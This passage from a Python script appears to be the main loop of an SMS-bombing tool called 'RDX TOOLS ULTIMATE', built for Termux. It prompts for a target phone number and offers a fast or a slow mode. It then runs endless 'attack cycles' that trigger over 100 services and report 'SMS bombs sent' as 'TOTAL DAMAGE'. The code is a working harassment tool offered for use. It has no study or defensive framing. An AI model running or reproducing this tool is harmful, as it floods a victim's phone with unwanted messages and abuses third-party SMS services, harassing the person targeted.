            print(f"{_c['g']}✅ SLOW MODE selected - All 100+ APIs{_c['e']}")
            break
        elif mode_choice == "2":
            _current_mode = 'fast'
            print(f"{_c['r']}✅ FAST MODE selected - All 100+ APIs{_c['e']}")
            break
        else:
            print(f"{_c['r']}❌ Invalid choice! Please enter 1 or 2.{_c['e']}")

    while True:
        phone_input = input(f"\n{_c['g']}[TARGET] Enter phone number: {_c['w']}").strip()
        if phone_input and len(phone_input) >= 10:
            break
        print(f"{_c['r']}[ERROR] Invalid phone number! Try again.{_c['e']}")

    phone_data = _format_phone_number(phone_input)
    print(f"{_c['c']}[INFO] Target: {_c['y']}{phone_data['with_0']}{_c['e']}")

    if _current_mode == 'fast':
        print(f"\n{_c['r']}⚠️  WARNING: FAST 100+ API BOMBING MODE!{_c['e']}")
        print(f"{_c['y']}🔥 100+ APIs × 3 waves × concurrent = MAXIMUM SPEED!{_c['e']}")
    else:
        print(f"\n{_c['r']}⚠️  WARNING: SLOW CONTROLLED BOMBING MODE!{_c['e']}")
        print(f"{_c['y']}🔄 100+ APIs × 5 requests each × slow speed = CONTROLLED POWER!{_c['e']}")

    print(f"{_c['p']}{'=' * 60}{_c['e']}")

    service_manager = _ServiceManager(phone_data)

    cycle_count = 0
    start_time = time.time()

    try:
        while True:
            if _state['exit']:
                break

            while _state['paused']:
                await asyncio.sleep(1)
                if _state['exit']:
                    break

            if _state['exit']:
                break

            cycle_count += 1
            current_time = _get_time()

            print(f"\n{_c['r']}{_c['B']}[ATTACK CYCLE #{cycle_count}] {_c['y']}{current_time}{_c['e']}")
            print(f"{_c['g']}[TARGET] {_c['y']}{phone_data['with_0']}{_c['e']}")
            print(f"{_c['g']}[TOTAL REQUESTS] {_c['y']}{_state['total']}{_c['e']}")
            print(f"{_c['g']}[SUCCESS RATE] {_c['y']}{(_state['success']/max(_state['total'],1)*100):.1f}%{_c['e']}")

            await service_manager.run_all_services()

            elapsed = time.time() - start_time
            attack_type = "Fast 100+ API" if _current_mode == 'fast' else "Slow 100+ API"
            print(f"\n{_c['g']}[CYCLE COMPLETE] {attack_type} Attack #{cycle_count} finished{_c['e']}")
            print(f"{_c['g']}[RUNTIME] {_c['y']}{elapsed/60:.1f} minutes{_c['e']}")
            print(f"{_c['g']}[TOTAL DAMAGE] {_c['y']}{_state['total']} SMS bombs sent{_c['e']}")

            print(f"{_c['c']}[COOLDOWN] Next attack cycle in:{_c['e']}")
            for i in range(_cfg[1], 0, -1):
                if _state['exit'] or _state['paused']:
                    break
                frame = _frames[i % len(_frames)]
                sys.stdout.write(f'\r{_c["r"]}[{frame}] Next cycle in {i}s...{_c["e"]}')
                sys.stdout.flush()
                time.sleep(1)

            print(f"\n{_c['p']}{'=' * 60}{_c['e']}")

    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"\n{_c['r']}💥 CRITICAL ERROR: {e}{_c['e']}")
        await _main()


if __name__ == "__main__":
    print(f"{_c['g']}🚀 Starting RDX TOOLS ULTIMATE...{_c['e']}")
    print(f"{_c['c']}📱 Termux/Mobile Optimized Version{_c['e']}")
    print(f"{_c['p']}Created by: {CREATOR_NAME}{_c['e']}\n")

    try:
        asyncio.run(_main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"\n{_c['r']}💥 STARTUP ERROR: {e}{_c['e']}")
